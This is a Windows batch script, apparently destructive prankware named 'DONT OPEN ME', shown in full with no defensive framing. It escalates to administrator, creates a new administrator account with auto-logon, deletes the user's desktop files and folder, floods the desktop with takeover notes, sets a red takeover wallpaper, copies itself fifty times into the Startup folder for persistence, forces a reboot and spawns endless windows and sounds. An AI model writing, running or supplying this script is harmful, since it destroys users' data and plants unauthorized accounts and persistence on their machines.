@echo off

net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

powershell -WindowStyle Hidden -Command ""

net user "DONT OPEN ME" /add
net localgroup Administrateurs "DONT OPEN ME" /add

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon /t REG_SZ /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName /t REG_SZ /d "DONT OPEN ME" /f

set desktop=%userprofile%\Desktop
del /f /q "%desktop%\*" >nul 2>&1
rmdir /s /q "%desktop%" >nul 2>&1

for /l %%i in (1,1,100) do (
    echo THIS SYSTEM BELONGS TO DONT OPEN ME > "%desktop%\DONT_OPEN_ME_IS_HERE_%%i.txt"
)

set wallpaper=%userprofile%\Desktop\DONT_OPEN_ME_RED.bmp
powershell -Command "& {
    $Width = 1920; $Height = 1080;
    $bitmap = New-Object Drawing.Bitmap $Width, $Height;
    $graphics = [Drawing.Graphics]::FromImage($bitmap);
    $redBrush = New-Object Drawing.SolidBrush ([Drawing.Color]::FromArgb(255, 255, 0, 0));
    $whiteBrush = New-Object Drawing.SolidBrush ([Drawing.Color]::White);
    $font = New-Object Drawing.Font('Arial', 48, [Drawing.FontStyle]::Bold);
    $graphics.FillRectangle($redBrush, 0, 0, $Width, $Height);
    $graphics.DrawString('DONT OPEN ME IS HERE', $font, $whiteBrush, 200, 400);
    $bitmap.Save('%wallpaper%');
}"

reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%wallpaper%" /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters

set startup_folder=%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
for /l %%i in (1,1,50) do (
    setlocal enabledelayedexpansion
    set random_name=!random!!random!
    copy "%~f0" "%startup_folder%\DONT_OPEN_ME_!random_name!.bat"
    endlocal
)

msg * "DONT OPEN ME HAS TAKEN OVER. THIS SYSTEM IS NO LONGER YOURS."
timeout /t 15 >nul

shutdown /r /f /t 15

for /l %%i in (1,1,50) do (
    start cmd /c echo DONT OPEN ME IS HERE && pause
)

:loop
    powershell -c (New-Object Media.SoundPlayer "C:\Windows\Media\chimes.wav").PlaySync()
    goto loop
